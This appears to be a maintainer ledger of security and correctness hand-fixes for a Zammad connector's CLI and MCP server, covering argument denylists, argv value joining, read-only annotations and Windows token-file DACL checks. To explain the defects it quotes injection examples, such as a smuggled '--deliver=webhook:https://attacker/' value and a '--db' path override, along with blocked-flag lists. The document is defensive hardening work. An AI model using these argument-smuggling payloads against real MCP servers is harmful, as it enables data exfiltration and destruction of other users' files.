_comment: Connector-specific edits to GENERATED/authored files that a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present (and banned anti-patterns absent) and fails CI if a reprint dropped one.

handfixes.summary: doctor probes a real GET endpoint with the real credential and refuses to dial a placeholder base_url, instead of calling any HTTP response 'reachable' and never checking the credential
handfixes.why: `doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` "reachable" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed "present, not verified" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as "FAIL API: unreachable" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282. Reprint 4.32.5 (2026-09-28): the press now emits doctorInfoKeys/doctorIsInfoKey and the `for k, v := range report` info-key skip natively (doctor_verdict.go no longer declares them); the placeholder refusal, the no-credential row and doctorUnexpectedStatus are still connector-only and re-applied by hand.

handfixes.summary: every operator credential this connector reads is declared on all three install channels: manifest.json (.mcpb), server.json (MCP Registry) and mcp-install.md (manual install)
handfixes.why: Issue #282 ('three live-verified connectors prompt for the wrong credentials'). A connector is installed through THREE independent channels that each carry their own copy of the credential list: manifest.json server.mcp_config.env (what the .mcpb bundle hands Claude Desktop, which has no shell profile, no config.toml and no export - so an undeclared variable is a variable nobody is ever asked for), server.json environmentVariables (the MCP Registry publish channel), and mcp-install.md's copy-paste JSON blocks plus its remote launch line (the manual path, which never touches the bundle at all). The fleet-wide audit found 60 of 65 connectors under-declaring 122 operator-facing variables in the manifest, 61 of 65 mcp-install.md pages omitting 125, and hudu's server.json missing the base URL its manifest marks required. For zammad the manifest gained: ZAMMAD_BASE_URL, ZAMMAD_URL. server.json gained: ZAMMAD_BASE_URL, ZAMMAD_URL. mcp-install.md's env blocks gained: ZAMMAD_BASE_URL, ZAMMAD_URL. manifest.json, server.json and mcp-install.md are ALL regenerated by /msp-skills-publish on an UPDATE or re-onboard, so without this ledger a regeneration silently drops every declaration and CI stays green (check_env_schema.py is wired --warn). The asserts below name the specific credentials, not a count, so dropping one and adding another cannot cancel out. Reprint 4.32.5 (2026-09-28): the press now also reads ZAMMAD_MCP_HTTP_TOKEN (bearer token for --transport http) and PRINTING_PRESS_CLIENT_PROFILE (tenant-gated client profile binding); both are declared on all three channels the way datagate declares them, and check_env_schema.py is what noticed. The 4.32 press reads ZAMMAD_USER_AGENT through cliutil.EnvOverride (client.go, deliver.go); once check_env_schema.py learned to follow that cross-package helper (#339) it became a visible read, so it is declared optional on all three channels the way auvik/avanan/threatlocker declare <SLUG>_USER_AGENT. The remote launch line in mcp-install.md (and the README / page.json ChatGPT answer) dropped the `--addr :7777` that onboard emits: the 4.32.5 server refuses a non-loopback --addr without --tls-cert/--tls-key (verified: "non-loopback --addr \":7777\" requires --tls-cert and --tls-key"), and its loopback default is already 127.0.0.1:7777; the line also gained ZAMMAD_MCP_HTTP_TOKEN, without which --transport http refuses to start.
handfixes.spec_encode_followup: cli-printing-press should emit server.mcp_config.env, the matching user_config prompts, server.json environmentVariables and mcp-install.md's env blocks from ONE declaration of the connector's operator-facing environment, so the three channels cannot be generated out of step. Until then check_env_schema.py compares all three and this ledger pins them.

handfixes.summary: The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing
handfixes.why: The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {"db": "/path/to/someone-elses.sqlite"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because "db=/tmp/evil" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect. Reprint 4.32.5 (2026-09-28): the press now emits blockedDestinationFlags (5 names), the argument-name '=' guard and the 4.30 blockedStructuredArgsForCommand schema shape natively, which closes residual (1) below. Still connector-only and re-applied by hand: the wider name floor (from-csv, home, input, notes-file, out, playbook-file, playbook-notes-file, reconcile), the union in cliArgsFromMCP, the usage-text rule (filesystemPathFlagPhrases / isFilesystemPathFlag / UnblockedFilesystemPathFlags / vendorAPIPathFlags) and the three tests.
handfixes.spec_encode_followup: Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.

handfixes.summary: `recall` and `playbook list` are annotated mcp:local-write, not mcp:read-only, because both open the writable learn store and record a row (issue #275 finding 4)
handfixes.why: issue #275 finding 4. `recall` (teach.go) declared mcp:read-only=true, opened the WRITABLE store via store.OpenWithContext and inserted a learn event on every call; `playbook list` (teach_playbook.go) was marked read-only and appended an audit record. The annotation is what an MCP host reads to decide what to auto-approve, so a false one is the same defect class as a doctor command that reports credentials fine without ever checking them: the promise, not the write, is the harm. The replacement is mcp:local-write, a tier this same engine already defines and already uses for `teach` and `playbook amend`: writes land only in the CLI's own local store, never in external state and never in a user-visible file, so the walker registers destructiveHint=false and openWorldHint=false while leaving readOnlyHint unset. Measured at the live MCP server before and after: recall and playbook_list went from readOnlyHint=true, openWorldHint=true to readOnlyHint=false, destructiveHint=false, openWorldHint=false. AGENTS.md is press-generated and carried the same claim in prose, so the annotation sentence there was regenerated from the booted server's tools/list and is pinned by the AGENTS.md asserts below. This is a TRUTH fix, not a behaviour fix - the RunE bodies are untouched and both commands still write exactly what they wrote before. Upstream closed this wontfix (mvanhorn/cli-printing-press#3555), so a reprint reintroduces the false annotation and this ledger is the only thing that catches it.
handfixes.spec_encode_followup: Upstream declined (mvanhorn/cli-printing-press#3555), so there is nothing to encode in the press today. If that is ever revisited, the rule is mechanical rather than a judgement call: a command whose RunE reaches store.OpenWithContext, appendLearningsAudit or any Insert must not carry mcp:read-only. `learnings list`, `learnings candidates` and `learnings stats` are the remaining teach-loop siblings: each still carries mcp:read-only and each still opens the writable store (creating the database file, running migrations and tightening file modes) though none records a row, and all three were left alone deliberately because the ratified decision named only `recall` and `playbook list`. The same shape is not confined to the teach loop: every command that reads this connector's local mirror opens it through the same read-write call, so what the press should encode is the mechanical rule above rather than a per-command list.

asserts.contains: // playbook list opens the WRITABLE learn store and appends an
which is narrower than it sounds

handfixes.summary: cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.
handfixes.why: blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {"json": "--deliver=webhook:https://attacker/"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot. FLIPPED to upstreamed on the 4.32.5 reprint (2026-09-28): cli-printing-press 4.32.5 emits all four joined branches, the '=' guard and TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag natively (shellout.go.tmpl carries #4647). The every-branch table (float / list / nested object -> --filter=map[a:1]) is not in the generated test, so it lives in the hand-authored shellout_argv_test.go and is pinned there.

handfixes.summary: hand-authored novel_wiring.go registers, through the generator's own registerNovelCommand hook, the commands the generator does not wire: `articles sync` under `articles`, and the carried stale/orphans/load workflow commands at the root
handfixes.why: Since press 4.32.5 the generator wires the research.json novels itself (root-level ones in root.go, kb browse/get/search in kb.go via addNovelCommandIfAbsent), but `articles sync` is a hand-authored command that is not a research.json novel, and stale/orphans/load are carried workflow commands the 4.32.5 press no longer emits, so nothing generated registers any of the four - they compiled, the tests passed, and the CLI and MCP server simply did not have them. root.go's registerNovelCommand hook is the press's sanctioned extension point (hooks run after every generated parent is attached, from init, without editing root.go), so the wiring survives a force regeneration by construction instead of as a BODY-DRIFT edit to articles.go. A fresh-base reprint that forgets to carry this file drops four shipped commands and four MCP tools while everything stays green; these asserts are what notices.

handfixes.summary: `stale`, `orphans` and `load` (pm_stale.go / pm_orphans.go / pm_load.go) are carried as hand files: press 4.28.0 emitted them as project-management workflow templates, the 4.32.5 profiler classes Zammad as the 'content' archetype and no longer emits them
handfixes.why: The three commands (and their MCP tools of the same names, all mcp:read-only) shipped in every zammad release through v0.1.5. cli-printing-press selects the pm_* workflow templates only when the profiler's VisionaryPlan archetype is 'project-management'; 4.32.5 classifies this spec as 'content' (visible in `context` output), so a plain regeneration silently removes three shipped commands while build, vet, test and every docs gate stay green (no README/SKILL/guide line names them). They compile unchanged against the 4.32.5 store API; their generated header was replaced by a hand-carried note and they are wired by novel_wiring.go. Retire this entry only when the shipped surface is intentionally trimmed and the CHANGELOG says so.

handfixes.summary: config.Load honours ZAMMAD_URL (instance root, /api/v1 appended) and ZAMMAD_BASE_URL (explicit API base, wins) through os.Getenv literals, so the CLI can be pointed at the operator's instance at all
handfixes.why: The shipped base_url is a placeholder (https://your-instance.zammad.com/api/v1) and every install surface - README, SKILL, guide, the .mcpb prompt, server.json and mcp-install.md - tells the operator to set ZAMMAD_URL. The 4.28.0 tree carried a hand-wired ZAMMAD_URL block in config.go that was never recorded in this ledger; the 4.32.5 regeneration dropped it, leaving a CLI that reads only ZAMMAD_BASE_URL, and only check_env_schema.py ('ZAMMAD_URL is declared in manifest.json but NO source file reads it') noticed - build, vet, test and every docs gate stayed green while the documented way to reach a real instance was gone. Both reads go through os.Getenv literals (the generated read used cliutil.EnvOverride, which the env-schema scanner cannot resolve) with cliutil.EffectiveEnv keeping the generator's unresolved-${user_config} placeholder handling. config_instance_url_test.go pins the resolution order in behaviour, not just in strings.
handfixes.spec_encode_followup: cli-printing-press could model an instance-root variable (x-instance-url-env / base_url_env with a fixed API path suffix) so per-instance connectors get this read generated.

handfixes.summary: the MCP server's --transport http listener sets ReadHeaderTimeout so a client cannot hold the listener open by dribbling request headers (gosec G112)
handfixes.why: cli-printing-press 4.32.5 emits the streamable-HTTP http.Server in cmd/<slug>-mcp/main.go without a ReadHeaderTimeout; the repo security gate flags it as gosec G112 (P1) and datagate carries the identical hand-fix. The listener is the remote/hosted deployment path, so the deadline is a real hardening rather than a scanner appeasement.
handfixes.spec_encode_followup: Press: set ReadHeaderTimeout in the generated MCP HTTP server template.

handfixes.summary: the Windows token-file guard compares trustees by SID, resolving SDDL aliases through the OS, so the built-in Administrator (RID 500, rendered as LA) can save and load credentials
handfixes.why: Press 4.30.2+ creds_perms_eval.go compared the SDDL text of the token file's owner and ACE trustees against the process's SID string. The SDDL converter renders the built-in local Administrator (RID 500) as the alias LA, so that account's own ACE never matched: `auth set-token` exited 1 with `token file DACL grants access to a non-owner principal (LA)` and every read refused the file. Reproduced 2026-10-15 on the published fortinet-cli 0.1.0, installed with the README one-liner on a windows-latest runner (whoami S-1-5-21-...-500). The fix resolves each trustee to its SID (fixed aliases from a table, machine-relative ones like LA through ConvertStringSidToSid, kept only when the converter renders that SID back to the same alias) and compares SIDs. The allow-list is unchanged (current user, BUILTIN\Administrators, SYSTEM): an owner or allow-ACE trustee that is any other principal, a broad group, or unresolvable is still refused. A reprint from an unfixed press silently restores the string compare while unit tests stay green on every non-Windows host.
handfixes.spec_encode_followup: Press defect in internal/generator/templates/cliutil_creds_perms_eval.go.tmpl and cliutil_creds_perms_windows.go.tmpl (unfixed on press main as of 4.33.5). Reported upstream: https://github.com/mvanhorn/cli-printing-press/issues/5029

asserts.contains: func trusteeSID(trustee string, resolveAlias sddlAliasResolver) string {

handfixes.summary: the Windows token-file guard checks the DACL section's framing, so a NULL DACL is refused in the form Windows actually renders it, flags first (D:PAINO_ACCESS_CONTROL), and DACL text that does not frame as flags plus complete six-field ACEs is refused rather than skipped
handfixes.why: Press creds_perms_eval.go refused a NULL DACL only when the DACL section began with NO_ACCESS_CONTROL. SDDL puts DACL flags (P, AI, AR) first, and a real NULL DACL on Windows Server 2025 renders as O:<owner>D:PAINO_ACCESS_CONTROL (measured on a windows-latest runner, 2026-10-15), so the guard found no ACEs to inspect and accepted a world-accessible token file. That was already a hole for every ordinary account; for the built-in Administrator the owner-alias mismatch happened to refuse it, so resolving LA (windows-sddl-alias-sid-compare) without this fix would have widened the hole. The DACL section's framing is now checked: its flags must be drawn from P/AI/AR/NO_ACCESS_CONTROL, an empty DACL followed by a SACL section ends at that section, and the ACE list must be complete, un-nested (...) groups of exactly six fields. Unknown flags, an unclosed or nested group, stray text, or a wrong field count is refused (fail-closed). ACE flags and rights are not validated; they do not change which principal an allow ACE names.
handfixes.spec_encode_followup: Same press templates as windows-sddl-alias-sid-compare; reported in the same upstream issue: https://github.com/mvanhorn/cli-printing-press/issues/5029
